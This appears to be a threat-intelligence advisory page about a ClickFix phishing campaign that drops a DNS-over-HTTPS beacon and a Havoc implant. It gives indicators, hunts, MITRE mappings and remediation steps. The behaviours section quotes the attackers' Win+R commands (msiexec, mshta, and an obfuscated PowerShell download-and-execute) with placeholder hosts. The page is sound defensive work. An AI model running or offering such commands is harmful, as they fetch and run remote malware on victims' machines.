# XaocMail ClickFix Campaign Dropping Phantom53 DoH C2 and Havoc

[Live entry](https://iocwatch.com/t/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/) · [Back to index](../../../../README.md) · [November 2026](../../README.md) · [2026-11-13](../README.md)

| Published | First added | Last updated | Category | Indicators | Block now |
|---|---|---|---|---|---|
| 2026-11-13 | 2026-11-13 14:18 | 2026-11-13 | Malware / RAT | 50 | 47 |

## Hunt

Run one of these before blocking to find past activity. Each file is the same hunt written for a different platform; pick the one for your SIEM or XDR.

| File | Platform | How to run it |
|---|---|---|
| [`hunt.kql`](hunt.kql) | Microsoft Defender XDR | In the [Defender portal](https://security.microsoft.com), open **Hunting > Advanced hunting**, paste the query and select **Run query**. It covers the last 30 days. |
| [`hunt.spl`](hunt.spl) | Splunk | In **Search & Reporting**, set the time picker to the last 30 days or more, paste the search and run it. It reads the CIM data models. |
| [`hunt_raw.spl`](hunt_raw.spl) | Splunk without CIM | The same hunt over raw events. Define the `rti_*` macros from [`splunk_macros.conf`](../../../../all/splunk_macros.conf) first. |
| [`hunt.yaral`](hunt.yaral) | Google SecOps | In **Detection > Rules & Detections > Rules Editor**, paste the rule, run a Retrohunt over the last 30 days, then turn on live mode. |

Leads that are not network or hash indicators are in [`iocs.csv`](iocs.csv), and behaviours with no clean field mapping are in the Behaviours section below. Guides: [Defender XDR](../../../../docs/defender-xdr.md), [Splunk](../../../../docs/splunk.md), [Google SecOps](../../../../docs/google-secops.md).

## Summary

SOCRadar's Threat Research Unit, writing on 13 November 2026, describes an active campaign by a Russian-speaking actor running since August 2026. XaocMail, a self-hosted phishing platform, sends personalised document-sharing emails from likely compromised mailboxes, linking to Cloudflare Worker ClickFix pages (securedoc subdomains on workers.dev). The victim pastes a Win+R command that runs an MSI (msiexec /i ... /qn), HTA or PowerShell payload. The MSI drops a private Python runtime in a random AppData folder and two scheduled tasks that run pythonw.exe: the Phantom53 beacon, which hides command and control in DNS-over-HTTPS AAAA answers from Cloudflare, Google and ControlD resolvers, and a watcher that loads a Havoc Demon in memory for chosen targets. Almost a thousand lures hit Latin America, Asia and Europe across technology, finance, education, government, logistics and manufacturing. Attacker servers, domains, the exfiltration URL and all malware hashes are on the block list.

> [!WARNING]
> All indicators come from one SOCRadar report; the actor is unnamed. 176.9.154.69 looks like a shared Hetzner proxy and the two GitHub URLs are abused paths on github.com, so those are alert only and github.com, workers.dev and the public DoH resolvers must never be blocked. Block each workers.dev host exactly as listed.

## Affected countries and sectors

- **Countries:** Brazil (BR), Peru (PE), India (IN), Indonesia (ID), Spain (ES)
- **Regions:** Latin America, Asia, Europe
- **Sectors:** Technology and IT, Finance, Education, Government, Logistics, Manufacturing
- **Note:** SOCRadar found almost a thousand personalised XaocMail lure pages, mostly aimed at Brazil and Peru, then India, Indonesia and Spain, spread evenly across sectors with a slight tilt toward technology and IT.
- **Source:** [SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)

## At a glance

| File | What it is |
|---|---|
| [`block_now.txt`](https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/block_now.txt) (raw) | 47 high-confidence indicators to block now |
| [`iocs.csv`](iocs.csv) | All 50 indicators with description, confidence, action and source |
| [`defender_xdr_indicators.csv`](defender_xdr_indicators.csv) | 50 rows for Defender XDR bulk import |
| [`hunt.kql`](hunt.kql) | Defender XDR advanced hunting query |
| [`hunt.spl`](hunt.spl) | Splunk hunt over the CIM data models |
| [`hunt_raw.spl`](hunt_raw.spl) | Splunk hunt for data not mapped to CIM ([macros](../../../../all/splunk_macros.conf)) |
| [`hunt.yaral`](hunt.yaral) | Google SecOps YARA-L 2.0 detection rule |

Indicators by type: 22 SHA256, 18 domains, 7 IPv4, 3 URLs. See `iocs.csv` for full details and descriptions.

## MITRE ATT&CK

| ID | Technique |
|---|---|
| [T1566.002](https://attack.mitre.org/techniques/T1566/002/) | Spearphishing Link |
| [T1204.004](https://attack.mitre.org/techniques/T1204/004/) | Malicious Copy and Paste |
| [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | Msiexec |
| [T1218.005](https://attack.mitre.org/techniques/T1218/005/) | Mshta |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task |
| [T1574.002](https://attack.mitre.org/techniques/T1574/002/) | DLL Side-Loading |
| [T1071.004](https://attack.mitre.org/techniques/T1071/004/) | DNS |
| [T1572](https://attack.mitre.org/techniques/T1572/) | Protocol Tunneling |
| [T1568.002](https://attack.mitre.org/techniques/T1568/002/) | Domain Generation Algorithms |
| [T1620](https://attack.mitre.org/techniques/T1620/) | Reflective Code Loading |
| [T1090](https://attack.mitre.org/techniques/T1090/) | Proxy |

## Recommended actions

1. Block the attacker IPs, domains (each workers.dev host exactly as listed), the exfiltration URL on 145.63.138.67:8125 and all Phantom53 and Havoc hashes, and search 90 days of proxy, DNS, firewall and EDR logs for them.
2. Alert on msiexec, mshta or PowerShell launched from the Run dialog with a workers.dev URL ending in /m?id=, /h?id= or /s?id=; isolate any host that hits.
3. Hunt scheduled tasks that run pythonw.exe with a .pyw script from AppData, the files p53_task_a.xml or p53_task_b.xml, and pythonw.exe in AppData talking to DoH resolvers.
4. On a confirmed host, remove both tasks and the random AppData Python folder, check HKCU\Software\Classes\CLSID for the beacon's state key, and reset the user's passwords and sessions.
5. Reduce ClickFix risk: restrict the Run dialog and msiexec from URLs for standard users, and warn staff about paste-this-command pages behind document-sharing emails.

## Behaviours to hunt

> Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.

1. **Alert** · ClickFix Run-dialog msiexec, mshta or PowerShell from workers.dev\
   Look for: msiexec, mshta or PowerShell started from the Run dialog (explorer.exe) with a workers.dev URL ending in /m?id=, /h?id= or /s?id=, or the reversed 'xei' Invoke-Expression trick\
   Why it matters: The XaocMail ClickFix page tells the victim to paste a command into Win+R: msiexec /i https://securedoc.[name].workers.dev/m?id=[id] /qn (the current, preferred mode), mshta https://.../h?id=, or powershell .(-join'xei'[-1..-3])((New-Object Net.WebClient).DownloadString('https://.../s?id=')). Tuning: parent must be explorer.exe, the child msiexec, mshta, powershell or pwsh, and the command line must carry a workers.dev URL with one of the three payload paths and an id= parameter, or the reversed xei string. Expected false positives: very rare; legitimate installers are not launched by hand from a workers.dev URL. Treat any hit as initial access.\
   Log source: Defender XDR DeviceProcessEvents; EDR process events\
   Source: [SOCRadar](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)

2. **Alert** · Scheduled task running pythonw.exe from AppData\
   Look for: A scheduled task that runs pythonw.exe with a .pyw script from a randomly named folder under AppData\
   Why it matters: The Phantom53 MSI drops a private Python 3.11 runtime into a random folder under %LOCALAPPDATA%, %APPDATA%, %APPDATA%\Microsoft or %LOCALAPPDATA%\Microsoft\WindowsApps and registers two tasks that run [folder]\pythonw.exe [random].pyw every 12 minutes (beacon) and every 3 minutes (watcher). Task names come from a pool: MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler or AdobeAcrobatUpdateTask followed by one random character. Tuning: the task action must contain pythonw.exe and a .pyw file under AppData; standard Python installs (\Programs\Python\, Microsoft Store PythonSoftwareFoundation, Anaconda or Miniconda) are excluded. Expected false positives: a developer's own scheduled Python script run from a portable or venv folder in AppData; a task name from the pool with a pythonw.exe action is close to certain.\
   Log source: Defender XDR DeviceEvents (ScheduledTaskCreated); Windows Security 4698; Task Scheduler operational log\
   Source: [SOCRadar](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)

3. **Alert** · p53_task_a.xml or p53_task_b.xml written\
   Look for: Files p53_task_a.xml or p53_task_b.xml written to the user's temp folder\
   Why it matters: When it is not elevated, Phantom53 writes %TEMP%\p53_task_a.xml and p53_task_b.xml and registers them with Register-ScheduledTask, which raises a UAC prompt showing a fake product name such as Node.js Runtime from OpenJS Foundation. The file names are specific to this malware. Expected false positives: none known.\
   Log source: Defender XDR DeviceFileEvents; EDR file events\
   Source: [SOCRadar](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)

4. **Hunt** · pythonw.exe in AppData using DoH resolvers\
   Look for: pythonw.exe running from a user AppData folder making DNS-over-HTTPS requests to public resolvers by IP or by dns.google\
   Why it matters: The Phantom53 beacon hides its command and control in DNS AAAA answers fetched by DoH POST to 1.1.1.1, 1.0.0.1, 8.8.8.8, 8.8.4.4, 76.76.2.11 or 76.76.10.11 on port 443, falling back to SNI hosts such as dns.google and then to plain UDP 53. Tuning: the process must be pythonw.exe under AppData, outside standard Python installs (\Programs\Python\, PythonSoftwareFoundation, Anaconda, Miniconda). Expected false positives: a Python tool in a user profile that uses a DoH library; browsers and the OS resolver are not pythonw.exe. Do not block the resolvers; hunt the process.\
   Log source: Defender XDR DeviceNetworkEvents; EDR network events; proxy logs\
   Source: [SOCRadar](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)

Behaviours that map cleanly to log fields are included in [`hunt.kql`](hunt.kql) and [`hunt.spl`](hunt.spl), and alert behaviours in [`hunt.yaral`](hunt.yaral). The rest are listed in the Behaviours section above with where to look. Use behaviours to hunt and alert, never to block.

## Sources

- [SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe](https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/)
- [ThreatFox – 94.156.152.7 tracked as Remcos C2 (IOC 1980891)](https://threatfox.abuse.ch/ioc/1980891/)

---

[Back to index](../../../../README.md)
